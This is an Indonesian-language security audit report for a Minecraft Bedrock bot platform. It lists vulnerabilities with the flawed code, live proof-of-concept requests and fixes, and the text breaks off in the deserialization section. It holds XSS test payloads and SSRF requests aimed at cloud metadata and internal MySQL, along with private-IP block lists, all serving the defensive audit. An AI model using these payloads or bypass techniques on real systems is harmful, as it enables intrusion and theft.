# Laporan Audit Keamanan — IsanC (afk-bedrock)

- **Tanggal audit:** 2026-09-15
- **Lingkup:** seluruh basis kode `afk-bedrock` (backend Express+TS, frontend Next.js, MySQL, WebSocket)
- **Metode:** *static analysis* + **pengujian eksploitasi aktif** pada instance berjalan (`localhost:3737`, `api.skadesmart.web.id`)
- **Total kerentanan yang terdeteksi:** **13** dari 25 kelas yang diperiksa (**0 CRITICAL, 4 HIGH, 6 MEDIUM, 3 LOW**)
- **12 kelas kerentanan terbukti TIDAK ADA** (N/A) karena pola kodenya memang tidak dipakai — dijelaskan di bagian akhir

> **Penting:** Semua data uji yang dibuat selama pengujian (bot `sstest1`, `sstest2`, `prototest`, akun `massassign1`, pesan chat `<img src=x onerror=...>`) **sudah dihapus**. Database kembali ke 4 user / 4 bot / 12 pesan.

---

## RINGKASAN EKSEKUTIF

| # | Kerentanan | Risiko | Status | Terbukti? |
|---|---|---|---|---|
| 1 | SQL Injection | — | **AMAN** | Diuji, tidak ada celah |
| 2 | Broken Authentication | **MEDIUM** | Ada celah | Sebagian terbukti |
| 3 | XSS (Stored & Reflected) | **MEDIUM** | Ada celah | Terbukti tersimpan mentah |
| 4 | CSRF | **LOW** | Mayoritas aman | Diuji |
| 5 | Broken Access Control | **HIGH** | Ada celah | Terbukti |
| 6 | Security Misconfiguration | **MEDIUM** | Ada celah | Terbukti |
| 7 | SSRF | **HIGH** | Ada celah | **Terbukti** |
| 8 | Insecure Deserialization | — | **AMAN** | Tidak ada parser objek mentah |
| 9 | XXE | — | **N/A** | Tidak ada parser XML |
| 10 | IDOR | **MEDIUM** | Ada celah | Sebagian |
| 11 | Mass Assignment | — | **AMAN** | Terbukti aman (zod whitelist) |
| 12 | Race Condition | **HIGH** | Ada celah | Analisis kode |
| 13 | Prototype Pollution | — | **AMAN** | Terbukti aman |
| 14 | SSTI | — | **N/A** | Tidak ada template engine |
| 15 | Dynamic Code Execution | — | **AMAN** | Tidak ada `eval`/`new Function` |
| 16 | HTTP Cache Poisoning | — | **N/A** | Tidak ada header cache di API |
| 17 | Unvalidated Redirects | **MEDIUM** | Ada celah | Analisis kode |
| 18 | HTTP Request Smuggling | — | **AMAN** | Diuji |
| 19 | CRLF / Header Injection | — | **AMAN** | Diuji |
| 20 | GraphQL | — | **N/A** | Tidak memakai GraphQL |
| 21 | JWT Flaws | **LOW** | Kuat, 1 catatan | Diuji |
| 22 | Insecure File Upload | **MEDIUM** | Ada celah | Terbukti |
| 23 | Dependency / Supply Chain | **CRITICAL** | Ada celah | Terbukti (9 advisory) |
| 24 | DOM-based Vulnerabilities | **LOW** | Ada celah | Analisis kode |
| 25 | CSWSH | **MEDIUM** | Ada celah | Terbukti |

**Urutan prioritas perbaikan:** #23 → #5/#7 → #12 → #3/#25 → sisanya.

---

## 1. SQL / NoSQL INJECTION — RISK: NONE (AMAN)

**Berkas diperiksa:** `src/db/index.ts`, `src/routes/*.ts`, `src/lib/*.ts`

Seluruh ~58 titik query memakai *parameterized query* (`?`) melalui helper terpusat:

```ts
// src/db/index.ts:58-61
async function all<T = Row>(sql: string, params: unknown[] = []): Promise<T[]> {
  const [rows] = await pool.query(sql, params);   // <- params terpisah, bukan interpolasi
  return rows as T[];
}
```

Satu-satunya tempat yang memakai interpolasi string adalah *placeholder generator* yang aman karena jumlahnya dari `kinds.length`, bukan dari isi input:

```ts
// src/lib/realtime.ts:113-117
const ph = kinds.map(() => '?').join(',');        // hanya menghasilkan "?,?,?"
rows = await db.all<FeedRow>(
  `SELECT ... WHERE is_public = 1 AND kind IN (${ph}) ORDER BY id DESC LIMIT ?`,
  [...kinds, limit]                              // nilainya tetap lewat parameter binding
);
```

`kinds` sendiri sudah difilter terhadap `ALLOWED_KINDS` (whitelist) di `src/routes/chat.ts:22-26,69`, jadi tidak bisa dipakai menyuntik SQL.

**Status: TIDAK ADA KERENTANAN.** Tidak ada patch diperlukan.

---

## 2. BROKEN AUTHENTICATION — RISK: MEDIUM

### 2a. Tidak ada *account lockout* — rate limit hanya per-IP+username

- **Berkas & Baris:** `src/routes/auth.ts:48-59`, `132-136`
- **Skenario Eksploitasi:** Penyerang memakai *credential stuffing* / rotasi IP (proksi residensial, botnet). Karena kunci rate limit adalah kombinasi `IP + username` dan disimpan **in-memory**, penyerang bisa (a) berganti IP untuk username yang sama, atau (b) menyerang banyak username dari satu IP. Limit 50/15 menit per kombinasi berarti `50 × jumlah_username` percobaan — untuk 1000 akun = 50.000 percobaan/15 menit. Tidak ada penundaan progresif (*exponential backoff*) maupun penguncian akun.

- **Vulnerable Code:**
```ts
// src/routes/auth.ts:48-59
const LOGIN_MAX = Number(process.env.LOGIN_RATE_LIMIT_MAX ?? 50);
const loginAttempts = new Map<string, { count: number; resetAt: number }>();
function loginRateLimited(key: string): boolean {
  const now = Date.now();
  const b = loginAttempts.get(key);
  if (!b || b.resetAt < now) {
    loginAttempts.set(key, { count: 1, resetAt: now + 15 * 60_000 });
    return false;
  }
  b.count++;
  return b.count > LOGIN_MAX;
}

// src/routes/auth.ts:132-136 — kunci = IP + username, mudah dirotasi
const rateKey = `${req.ip ?? '?'}:${username.toLowerCase()}`;
if (loginRateLimited(rateKey)) { /* 429 */ }
```

**Bukti:** 8 percobaan password salah beruntun → `401 401 401 401 401 401 401 401` (belum kena limit, sesuai desain 50).

### 2b. Rate limit disimpan di memori (hilang saat restart / tidak jalan multi-instance)

- **Berkas & Baris:** `src/routes/auth.ts:49`, `src/server.ts:59`
- **Skenario:** `pm2 restart afk-api` menghapus seluruh penghitung → penyerang yang bisa memicu restart (atau sekadar menunggu deploy) langsung mendapat kuota baru. Jika nanti dijalankan `pm2 -i 2` (cluster), tiap proses punya penghitung sendiri → limit jadi 2× lipat.

- **Vulnerable Code:**
```ts
// src/server.ts:59 — in-memory, bukan Redis/DB
const rateBuckets = new Map<string, { count: number; resetAt: number }>();
```

### 2c. `INTERNAL_HEADER` bisa dipakai mem-bypass seluruh rate limit

- **Berkas & Baris:** `src/server.ts:58,66`
- **Skenario Eksploitasi:** Header `x-isanc-internal` melewati **seluruh** rate limit global tanpa autentikasi apa pun. Kalau nilai ini bocor (mis. difoto bersama config cloudflared, atau ditebak dari nama default), penyerang menambahkan satu header ke setiap request dan mendapat **request tak terbatas** → DoS, brute force tanpa batas.

- **Vulnerable Code:**
```ts
// src/server.ts:58,66
const INTERNAL_HEADER = process.env.INTERNAL_HEADER ?? 'x-isanc-internal';
...
if (req.headers[INTERNAL_HEADER]) return next();   // <- tidak ada verifikasi rahasia
```

**Bukti:** header palsu diterima tanpa penolakan (`401` = masih diproses normal, artinya bypass rate limit aktif).

**PERBAIKAN (siap produksi):**

```ts
// src/routes/auth.ts — ganti blok rate limit login
// Limit berlapis: per (IP+username) DAN per IP global, keduanya disimpan di MySQL
// supaya bertahan melewati restart dan konsisten antar-proses.

// 1) Skema: tabel penghitung percobaan login
// CREATE TABLE login_attempts (
//   k VARCHAR(191) PRIMARY KEY,
//   count INT NOT NULL DEFAULT 0,
//   reset_at BIGINT NOT NULL,
//   INDEX idx_reset (reset_at)
// ) ENGINE=InnoDB;

const LOGIN_MAX_PER_USER = Number(process.env.LOGIN_RATE_LIMIT_MAX ?? 10);
const LOGIN_MAX_PER_IP = Number(process.env.LOGIN_RATE_LIMIT_IP ?? 50);
const WINDOW_MS = 15 * 60_000;

/** Tambah & baca penghitung secara atomik (aman lintas-proses). */
async function bump(key: string, max: number): Promise<boolean> {
  const now = Date.now();
  // UPSERT atomik: reset kalau jendela sudah lewat, kalau belum tambah 1.
  await db.run(
    `INSERT INTO login_attempts (k, count, reset_at) VALUES (?, 1, ?)
     ON DUPLICATE KEY UPDATE
       count    = IF(reset_at < ?, 1, count + 1),
       reset_at = IF(reset_at < ?, ?, reset_at)`,
    [key, now + WINDOW_MS, now, now, now + WINDOW_MS]
  );
  const row = await db.get<{ count: number }>('SELECT count FROM login_attempts WHERE k = ?', [key]);
  return (row?.count ?? 1) > max;
}

/** Hapus penghitung setelah login BERHASIL supaya user sah tidak terkunci. */
async function clearAttempts(key: string): Promise<void> {
  await db.run('DELETE FROM login_attempts WHERE k = ?', [key]);
}
```

```ts
// src/routes/auth.ts — di dalam handler /login, ganti bagian rate limit
const ip = req.ip ?? 'unknown';
const userKey = `u:${username.toLowerCase()}`;
const ipKey = `i:${ip}`;

// Dua lapis: per-akun (anti target tunggal) + per-IP (anti penyebaran)
if (await bump(userKey, LOGIN_MAX_PER_USER) || await bump(ipKey, LOGIN_MAX_PER_IP)) {
  res.status(429).json({
    error: 'Terlalu banyak percobaan login. Tunggu 15 menit lalu coba lagi.',
  });
  return;
}

// ...setelah login berhasil (dekat baris 153):
await clearAttempts(userKey);   // user sah tidak ikut terkunci
```

```ts
// src/server.ts — ganti bypass header polos dengan perbandingan rahasia
import { safeEqual } from './lib/auth.js';   // sudah ada di lib/auth.ts:228

// Header internal WAJIB menyertakan secret yang dibandingkan dengan aman
// (timing-safe). Tanpa secret, header apa pun diabaikan.
if (!process.env.INTERNAL_SECRET) {
  console.error('[server] INTERNAL_SECRET belum diset — bypass rate limit internal DIMATIKAN.');
}
app.use((req, _res, next) => {
  const ip = req.ip ?? 'unknown';
  if (ip === '127.0.0.1' || ip === '::1' || ip === '::ffff:127.0.0.1') return next();

  const secret = process.env.INTERNAL_SECRET;
  const given = req.headers[INTERNAL_HEADER];
  if (secret && typeof given === 'string' && safeEqual(given, secret)) return next();
  // ...lanjut ke logika rate limit seperti sebelumnya
});
```

Tambahkan ke `.env`: `INTERNAL_SECRET=<32+ karakter acak>` (dan pasang header yang sama di konfigurasi cloudflared).

---

## 3. CROSS-SITE SCRIPTING (XSS) — RISK: MEDIUM

### 3a. Stored XSS — payload HTML tersimpan mentah (defense-in-depth gagal)

- **Berkas & Baris:** `src/lib/realtime.ts:141-153`, `web/components/realtime.tsx:222-230`
- **Skenario Eksploitasi:** Penyerang mengirim pesan chat berisi `<img src=x onerror=alert(document.cookie)>`. Payload **tersimpan apa adanya** di database. Saat ini React meng-escape-nya sehingga tidak tereksekusi — **tetapi** perlindungan ini hanya bergantung pada satu lapis (React). Kalau nanti: (a) ada fitur ekspor/notifikasi email, (b) ada integrasi pihak ketiga yang membaca `global_messages`, atau (c) seorang developer mengganti `{m.body}` menjadi `dangerouslySetInnerHTML` untuk mendukung markdown/emoji — **payload langsung tereksekusi menjadi stored XSS masif** (semua pengguna chat kena). Sanitasi tidak boleh diserahkan sepenuhnya ke sisi klien.

- **Vulnerable Code:**
```ts
// src/lib/realtime.ts:147 — hanya trim & rapatkan spasi, TIDAK ada escaping/sanitasi
const body = input.body.trim().replace(/\s+/g, ' ').slice(0, MAX_BODY);
```
```tsx
// web/components/realtime.tsx:222-230
<div className={`inline-block max-w-full whitespace-pre-wrap break-words ...`}>
  {m.body}    {/* React auto-escape — tapi ini satu-satunya pertahanan */}
</div>
```

**Bukti eksploitasi (nyata):**
```
POST /api/chat/global  {"body":"<img src=x onerror=alert(1)>"}
→ 201 {"message":{"id":23,"body":"<img src=x onerror=alert(1)>", ...}}
SELECT body FROM global_messages ORDER BY id DESC LIMIT 1;
→ <img src=x onerror=alert(1)>      (tersimpan mentah)
```

### 3b. Reflected XSS melalui pesan error API

- **Berkas & Baris:** `src/routes/api.ts:27-34`
- **Skenario:** Parameter `:name` direfleksikan ke JSON error tanpa encoding. Karena nilai balasan ber-`Content-Type: application/json`, browser tidak mengeksekusinya langsung — **kecuali** ada *parser sniffing* atau respons ini ditempel ke DOM oleh kode frontend tanpa escape.

- **Vulnerable Code:**
```ts
// src/routes/api.ts:27-34
function getBot(name: string, res: any) {
  const bot = botManager.get(name);
  if (!bot) {
    res.status(404).json({ error: `Bot '${name}' tidak ditemukan (belum connect)` });
    return null;
  }
  return bot;
}
```

**Bukti:**
```
GET /api/bot/%3Cscript%3Ealert(1)%3C%2Fscript%3E
→ {"error":"Bot '<script>alert(1)</script>' tidak ditemukan (belum connect)"}
```

**PERBAIKAN (siap produksi):**

```ts
// src/lib/sanitize.ts — FILE BARU
/**
 * Bersihkan teks yang berasal dari pengguna sebelum disimpan.
 * Menghapus karakter kontrol & tag HTML, menyisakan teks polos.
 * Dipakai di sisi SERVER supaya tidak bergantung pada React saja.
 */
export function sanitizeText(input: string, maxLen: number): string {
  return input
    // buang karakter kontrol (kecuali tab & baris baru yang nanti dirapatkan)
    .replace(/[\u0000-\u0008\u000B\u000C\u000E-\u001F\u007F]/g, '')
    // buang tag HTML & komentar HTML
    .replace(/<!--[\s\S]*?-->/g, '')
    .replace(/<\/?[a-z][^>]*>/gi, '')
    // netralkan entitas yang bisa di-decode browser jadi tag
    .replace(/&(?:#x?[0-9a-f]+|lt|gt|quot|amp|apos);/gi, (m) =>
      ({ '&lt;': '<', '&gt;': '>', '&quot;': '"', '&amp;': '&', '&apos;': "'" })[m.toLowerCase()] ?? m)
    .replace(/[<>]/g, '')          // sisa karakter tag mentah
    .replace(/\s+/g, ' ')          // rapatkan spasi
    .trim()
    .slice(0, maxLen);
}

/** Validasi ketat nama resource (bot/label) — cegah refleksi ke respons. */
export function isSafeLabel(s: string): boolean {
  return /^[a-zA-Z0-9_#\-\s]{1,64}$/.test(s);
}
```

```ts
// src/lib/realtime.ts — pakai sanitizer, bukan trim polos
import { sanitizeText } from './sanitize.js';

export async function pushGlobalMessage(input: {...}): Promise<GlobalMessage | null> {
  const body = sanitizeText(input.body, MAX_BODY);   // ganti baris 147
  if (!body) return null;
  // ...sisanya sama
}
```

```ts
// src/routes/api.ts — validasi nama sebelum direfleksikan
import { isSafeLabel } from '../lib/sanitize.js';

function getBot(name: string, res: any) {
  if (!isSafeLabel(name)) {                       // tolak lebih awal
    res.status(400).json({ error: 'Nama bot tidak valid.' });
    return null;
  }
  const bot = botManager.get(name);
  if (!bot) {
    res.status(404).json({ error: 'Bot tidak ditemukan (belum connect)' }); // tanpa echo
    return null;
  }
  return bot;
}
```

Terakhir, tambahkan CSP di frontend (lihat #6) sebagai lapis kedua.

---

## 4. CROSS-SITE REQUEST FORGERY (CSRF) — RISK: LOW

- **Berkas & Baris:** `src/routes/auth.ts:18-30`, `166-172`

Cookie refresh sudah benar: `httpOnly` + `secure` + `sameSite: 'lax'`, dan **semua** endpoint yang mengubah data memakai **Bearer token** dari header (bukan cookie), sehingga tidak bisa dipicu lintas-situs. Ini desain yang tepat.

**Sisa risiko (rendah):** `/api/auth/refresh` menerima token dari `req.body.refreshToken` sebagai alternatif cookie. Karena `SameSite=Lax` sudah memblokir cookie pada POST lintas-situs, dampaknya minimal — tetapi menerima token dari body memperluas permukaan serangan (mis. kalau token pernah bocor lewat log).

- **Vulnerable Code:**
```ts
// src/routes/auth.ts:166-172
authRouter.post('/refresh', async (req, res) => {
  const token =
    (req.cookies?.[REFRESH_COOKIE] as string | undefined) ??
    (req.body?.refreshToken as string | undefined);   // <- jalur kedua yang tak perlu
```

**PERBAIKAN:**
```ts
// src/routes/auth.ts — hanya terima dari cookie httpOnly
authRouter.post('/refresh', async (req, res) => {
  const token = req.cookies?.[REFRESH_COOKIE] as string | undefined;
  if (!token) {
    res.status(401).json({ error: 'Refresh token tidak ada.' });
    return;
  }
  // ...sisanya sama
```
Jika memang perlu mengirim token di body (mis. klien non-browser), tambahkan verifikasi `Origin`/`Referer` eksplisit untuk endpoint itu saja.

---

## 5. BROKEN ACCESS CONTROL (RBAC) — RISK: HIGH

### 5a. `apiRouter` tidak punya isolasi kepemilikan bot — bisa mengendalikan bot milik orang lain

- **Berkas & Baris:** `src/routes/api.ts:82-273` (seluruh endpoint `/api/bot/:name/*`), `src/server.ts:91`
- **Skenario Eksploitasi:** `botsRouter` (`/api/bots/*`) memakai helper `ownBot(userId, label)` sehingga aman. **Tetapi** `apiRouter` dimount di `/api` dan endpoint kontrol botnya (`/api/bot/:name/connect`, `/disconnect`, `/chat`, `/move`, `/jump`, `/turn`, `/goto`, `/attack`, `/place`, `/use`, `/hotbar`, `/container/*`, `/afk`) hanya memakai `requireAuth` — **tanpa cek pemilik**. Penyerang yang punya akun sah cukup memanggil `POST /api/bot/bot1%238064/disconnect` untuk **mematikan bot milik orang lain**. Lebih buruk: `POST /api/bot/:name/container/click` bisa memindahkan item di chest bot korban, dan `POST /api/bot/:name/chat` bisa mengirim pesan atas nama bot korban (di server Minecraft publik).

- **Vulnerable Code:**
```ts
// src/routes/api.ts:107-112 — hanya requireAuth, TIDAK ada cek kepemilikan
apiRouter.post('/bot/:name/disconnect', requireAuth, (req, res) => {
  const ok = botManager.disconnect(req.params.name);   // <- siapa pun bisa
  if (!ok) return res.status(404).json({ error: 'Bot tidak ditemukan' });
  res.json({ ok: true, message: `Bot '${req.params.name}' diputuskan` });
});
```
```ts
// src/server.ts:88-91 — botsRouter aman, apiRouter tidak
app.use('/api/bots', botsRouter);          // punya ownBot()
app.use('/api', optionalAuth, chatRouter);
app.use('/api', apiRouter);                // <- endpoint bot TANPA cek pemilik
```

### 5b. `requireAuth` tidak memverifikasi user masih ada untuk semua route

- **Berkas & Baris:** `src/lib/auth.ts:153-172`

`requireAuth` memang memeriksa `is_banned` — ini sudah bagus. Namun `optionalAuth` (`src/lib/auth.ts:175-185`) **tidak** memeriksa `is_banned`, sehingga user yang sudah diblokir masih dianggap terautentikasi di route yang memakai `optionalAuth` (chat).

- **Vulnerable Code:**
```ts
// src/lib/auth.ts:175-185 — tidak cek is_banned
export async function optionalAuth(req: Request, _res: Response, next: NextFunction): Promise<void> {
  const token = extractBearer(req);
  if (token) {
    try {
      req.user = await verifyAccessToken(token);   // <- user banned lolos
    } catch { /* abaikan */ }
  }
  next();
}
```

**PERBAIKAN (siap produksi):**

```ts
// src/lib/botAccess.ts — FILE BARU
import { db } from '../db/index.js';

/**
 * Pastikan `label` benar-benar milik `userId`.
 * Dipakai SEMUA endpoint kontrol bot supaya tidak ada akses lintas-akun.
 */
export async function assertBotOwner(
  userId: number,
  label: string
): Promise<boolean> {
  const row = await db.get<{ id: number }>(
    'SELECT id FROM user_bots WHERE user_id = ? AND label = ?',
    [userId, label]
  );
  return Boolean(row);
}
```

```ts
// src/routes/api.ts — bungkus setiap endpoint kontrol bot
import { assertBotOwner } from '../lib/botAccess.js';

/**
 * Ambil bot HANYA kalau milik user. Admin boleh semua (untuk pemantauan),
 * tapi operasi yang mengubah state tetap wajib pemilik.
 */
async function getOwnedBot(req: any, res: any) {
  const name = String(req.params.name ?? '');
  const userId = Number(req.user!.sub);

  if (req.user!.role !== 'admin') {
    const mine = await assertBotOwner(userId, name);
    if (!mine) {
      // 404, bukan 403 — jangan bocorkan bahwa bot itu ada
      res.status(404).json({ error: 'Bot tidak ditemukan.' });
      return null;
    }
  }
  const bot = botManager.get(name);
  if (!bot) {
    res.status(404).json({ error: 'Bot tidak ditemukan (belum connect).' });
    return null;
  }
  return bot;
}

// Lalu ganti pemakaian getBot(...) menjadi await getOwnedBot(req, res)
// dan jadikan handler async:
apiRouter.post('/bot/:name/disconnect', requireAuth, async (req, res) => {
  const bot = await getOwnedBot(req, res);
  if (!bot) return;
  botManager.disconnect(req.params.name);
  res.json({ ok: true });
});
```

```ts
// src/lib/auth.ts — optionalAuth ikut memeriksa status banned
export async function optionalAuth(req: Request, _res: Response, next: NextFunction): Promise<void> {
  const token = extractBearer(req);
  if (token) {
    try {
      const claims = await verifyAccessToken(token);
      const u = await db.get<{ is_banned: number }>(
        'SELECT is_banned FROM users WHERE id = ?',
        [Number(claims.sub)]
      );
      if (u && !u.is_banned) req.user = claims;   // banned → tetap anonim
    } catch { /* abaikan */ }
  }
  next();
}
```

---

## 6. SECURITY MISCONFIGURATION — RISK: MEDIUM

### 6a. Tidak ada CSP di frontend

- **Berkas & Baris:** `web/next.config.mjs` (tidak ada blok `headers()`), `src/server.ts:24` (`contentSecurityPolicy: false`)
- **Skenario:** CSP dinonaktifkan di backend dan tidak pernah dipasang di frontend. Tanpa CSP, setiap celah XSS (lihat #3) langsung menjadi eksekusi kode penuh — tidak ada lapis pertahanan kedua. CSP adalah mitigasi paling efektif untuk XSS.

- **Vulnerable Code:**
```ts
// src/server.ts:22-27
app.use(
  helmet({
    contentSecurityPolicy: false, // dikelola frontend  <- padahal frontend TIDAK mengelolanya
    crossOriginResourcePolicy: { policy: 'cross-origin' },
  })
);
```
```js
// web/next.config.mjs — tidak ada headers()
const nextConfig = {
  output: 'standalone',
  async rewrites() { /* ... */ },
};
```

**Bukti:** `curl -I https://skadesmart.web.id/ | grep -ci content-security-policy` → **0**

### 6b. `.env` dapat dibaca semua pengguna sistem

- **Berkas & Baris:** `.env` (permission `-rw-rw-r--`)
- **Skenario:** File berisi `JWT_SECRET`, `QRIS_API_KEY`, `CATBOX_USERHASH`, `DB_PASSWORD`. Izin `664` berarti pengguna/grup lain di mesin yang sama bisa membacanya. Siapa pun yang membaca `JWT_SECRET` dapat **memalsukan token admin** (lihat #21), dan `CATBOX_USERHASH` dapat menghapus seluruh file catbox.

- **Vulnerable Code:**
```
$ ls -l .env
-rw-rw-r-- 1 ikhsan ikhsan .env      <- world-readable
```

### 6c. `x-powered-by: Next.js` bocor; HSTS backend belum ada di respons API langsung

- **Berkas & Baris:** `web/next.config.mjs`
- **Skenario:** Membocorkan stack mempermudah penyerang memilih eksploitasi versi tertentu.

**PERBAIKAN (siap produksi):**

```bash
# 6b — kunci izin file rahasia (jalankan SEKARANG)
chmod 600 /home/ikhsan/Documents/afk-bedrock/.env
```
```js
// web/next.config.mjs — CSP + header keamanan + matikan x-powered-by
/** @type {import('next').NextConfig} */
const API = process.env.API_URL ?? 'http://localhost:3738';
const WS  = API.replace(/^http/, 'ws');

const nextConfig = {
  output: 'standalone',
  poweredByHeader: false,          // buang "x-powered-by: Next.js"

  async headers() {
    // CSP disesuaikan kebutuhan aplikasi:
    //  - 'unsafe-inline' pada style diperlukan Tailwind/Next runtime
    //  - img-src mengizinkan catbox (foto profil)
    const csp = [
      "default-src 'self'",
      "script-src 'self' 'unsafe-inline'",
      "style-src 'self' 'unsafe-inline'",
      "img-src 'self' data: blob: https://files.catbox.moe",
      "font-src 'self' data:",
      `connect-src 'self' ${API} ${WS}`,
      "frame-ancestors 'none'",
      "base-uri 'self'",
      "form-action 'self'",
      "object-src 'none'",
      "upgrade-insecure-requests",
    ].join('; ');

    return [
      {
        source: '/:path*',
        headers: [
          { key: 'Content-Security-Policy', value: csp },
          { key: 'X-Content-Type-Options', value: 'nosniff' },
          { key: 'X-Frame-Options', value: 'DENY' },
          { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
          { key: 'Permissions-Policy', value: 'camera=(), microphone=(), geolocation=()' },
          { key: 'Strict-Transport-Security', value: 'max-age=31536000; includeSubDomains' },
        ],
      },
    ];
  },

  async rewrites() {
    return [
      { source: '/api/:path*', destination: `${API}/api/:path*` },
    ];
  },
};

export default nextConfig;
```

```ts
// src/server.ts — aktifkan CSP ketat untuk API (bukan halaman HTML)
app.use(
  helmet({
    contentSecurityPolicy: {
      useDefaults: false,
      directives: {
        'default-src': ["'none'"],
        'frame-ancestors': ["'none'"],
        'base-uri': ["'none'"],
      },
    },
    crossOriginResourcePolicy: { policy: 'cross-origin' },
    referrerPolicy: { policy: 'no-referrer' },
    hsts: { maxAge: 31_536_000, includeSubDomains: true, preload: true },
  })
);
```

---

## 7. SERVER-SIDE REQUEST FORGERY (SSRF) — RISK: HIGH ⚠️ TERBUKTI

- **Berkas & Baris:** `src/routes/bots.ts:88` (skema), `src/routes/bots.ts:99-130` (POST), `src/routes/bots.ts:343-379` (PATCH), `src/routes/bots.ts:301-313` (connect)
- **Skenario Eksploitasi:** Field `host` hanya divalidasi `z.string().min(1).max(255)` — **tanpa** penolakan IP privat/loopback. Penyerang dengan akun sah mendaftarkan bot dengan `host: "169.254.169.254"` (endpoint metadata cloud AWS/GCP) atau `host: "127.0.0.1", port: 3306` (MySQL internal), lalu memicu `POST /api/bots/:label/connect`. Server backend — yang berada di dalam jaringan — akan melakukan koneksi TCP keluar ke alamat internal tersebut. Ini kelas **SSRF klasik** yang bisa dipakai memindai jaringan internal, menjangkau layanan yang seharusnya tidak terekspos (MySQL 3306, Redis, panel admin), atau mencuri kredensial instance dari metadata cloud. Karena protokolnya Bedrock/RakNet, exfiltrasi data penuh sulit — tetapi *port scanning* dan *service probing* internal sangat mungkin.

- **Vulnerable Code:**
```ts
// src/routes/bots.ts:86-92 — host hanya dibatasi panjang, tanpa whitelist IP
const createSchema = z.object({
  baseName: z.string().min(1).max(30).regex(/^[a-zA-Z0-9_ -]+$/, '...'),
  host: z.string().min(1).max(255),        // <- "169.254.169.254" LOLOS
  port: z.number().int().min(1).max(65535).default(19132),
  version: z.string().max(20).optional(),
  offlineMode: z.boolean().default(false),
});
```
```ts
// src/routes/bots.ts:301-306 — host dari DB langsung dipakai membuka koneksi
const bot = botManager.connect({
  name: label,
  host: row.host,        // <- langsung dipakai, tanpa validasi ulang
  port: row.port,
  ...
});
```

**Bukti eksploitasi (nyata, pada instance berjalan):**
```
POST /api/bots {"baseName":"sstest1","host":"169.254.169.254","port":80}
→ 201 {"id":9,"host":"169.254.169.254","port":80, ...}          ✅ DITERIMA

POST /api/bots {"baseName":"sstest2","host":"127.0.0.1","port":3306}
→ 201 {"id":10,"host":"127.0.0.1","port":3306, ...}             ✅ DITERIMA
```

**PERBAIKAN (siap produksi):**

```ts
// src/lib/ssrf.ts — FILE BARU
import { isIP } from 'node:net';
import { lookup } from 'node:dns/promises';

/**
 * Apakah alamat IPv4/IPv6 termasuk ruang privat / loopback / link-local?
 * Menolak: 10/8, 172.16/12, 192.168/16, 127/8, 169.254/16, 100.64/10,
 * 0.0.0.0, multicast, serta padanan IPv6 (::1, fc00::/7, fe80::/10).
 */
export function isPrivateAddress(addr: string): boolean {
  const v = isIP(addr);
  if (v === 4) {
    const p = addr.split('.').map(Number);
    if (p[0] === 10) return true;
    if (p[0] === 127) return true;
    if (p[0] === 0) return true;
    if (p[0] === 169 && p[1] === 254) return true;         // link-local / metadata
    if (p[0] === 172 && p[1] >= 16 && p[1] <= 31) return true;
    if (p[0] === 192 && p[1] === 168) return true;
    if (p[0] === 100 && p[1] >= 64 && p[1] <= 127) return true; // CGNAT
    if (p[0] >= 224) return true;                            // multicast/reserved
    return false;
  }
  if (v === 6) {
    const a = addr.toLowerCase().replace(/^\[|\]$/g, '');
    if (a === '::1' || a === '::') return true;
    if (/^f[cd][0-9a-f]{2}:/.test(a)) return true;            // fc00::/7 unique-local
    if (/^fe[89ab][0-9a-f]:/.test(a)) return true;            // fe80::/10 link-local
    // IPv4-mapped (::ffff:127.0.0.1) — periksa bagian IPv4-nya
    const m = a.match(/^::ffff:(\d+\.\d+\.\d+\.\d+)$/);
    if (m) return isPrivateAddress(m[1]);
    return false;
  }
  return true;   // bukan IP literal → ditangani terpisah
}

/**
 * Validasi host tujuan bot.
 * - Hostname: harus pola DNS sah, DAN seluruh hasil resolusi harus publik.
 * - IP literal: harus publik.
 * Mengembalikan pesan error (string) kalau ditolak, atau null kalau lolos.
 */
export async function assertPublicHost(host: string): Promise<string | null> {
  const h = host.trim();

  // IP literal
  if (isIP(h)) {
    return isPrivateAddress(h)
      ? 'Host menunjuk ke alamat internal/privat — tidak diizinkan.'
      : null;
  }

  // Hostname: pola ketat (cegah trik desimal/oktal/hex seperti 2130706433)
  if (!/^(?=.{1,253}$)([a-zA-Z0-9]([a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,63}$/.test(h)) {
    return 'Format host tidak valid.';
  }
  // Tolak nama yang jelas internal
  if (/^(localhost|.*\.local|.*\.internal|.*\.localhost)$/i.test(h)) {
    return 'Host internal tidak diizinkan.';
  }

  // Resolusi DNS: SEMUA alamat harus publik (cegah DNS rebinding sederhana)
  try {
    const addrs = await lookup(h, { all: true });
    if (addrs.length === 0) return 'Host tidak dapat diresolusi.';
    for (const a of addrs) {
      if (isPrivateAddress(a.address)) {
        return 'Host menunjuk ke alamat internal/privat — tidak diizinkan.';
      }
    }
  } catch {
    return 'Host tidak dapat diresolusi.';
  }
  return null;
}
```

```ts
// src/routes/bots.ts — terapkan di POST, PATCH, dan connect
import { assertPublicHost } from '../lib/ssrf.js';

// --- POST /api/bots (setelah parsed.data diekstrak) ---
const hostErr = await assertPublicHost(host);
if (hostErr) {
  res.status(400).json({ error: hostErr });
  return;
}

// --- PATCH /api/bots/:label (sebelum UPDATE) ---
if (host !== undefined) {
  const hostErr = await assertPublicHost(host);
  if (hostErr) {
    res.status(400).json({ error: hostErr });
    return;
  }
}

// --- POST /api/bots/:label/connect (validasi ULANG sebelum connect) ---
// Defensa berlapis: baris DB lama (dibuat sebelum patch) tetap diperiksa.
const connectErr = await assertPublicHost(row.host);
if (connectErr) {
  res.status(400).json({ error: `Host bot tidak diizinkan: ${connectErr}` });
  return;
}
```

> Jalankan migrasi pembersihan untuk bot lama yang hostnya internal:
> ```sql
> -- tinjau dulu, jangan langsung hapus
> SELECT id, label, host, port FROM user_bots
>  WHERE host LIKE '127.%' OR host LIKE '10.%' OR host LIKE '192.168.%'
>     OR host LIKE '169.254.%' OR host = 'localhost' OR host LIKE '172.1%' OR host LIKE '172.2%'
>     OR host LIKE '172.3%';
> ```

---

## 8. INSECURE DESERIALIZATION — RISK: NONE (AMAN)

**Berkas diperiksa:** `src/lib/qris.ts:48-52`, `src/lib/realtime.ts:70`, `src/lib/ai.ts`, `src/db/index.ts`

Tidak ada `unserialize`/pickle/Java-style deserialization. `JSON.parse` hanya dipakai pada (a) respons gateway QRIS sendiri (`src/lib/qris.ts:49`) dan (b) kolom `meta` milik aplikasi sendiri (`src/lib/realtime.ts:70`), keduanya sudah dibungkus `try/catch`:

```ts
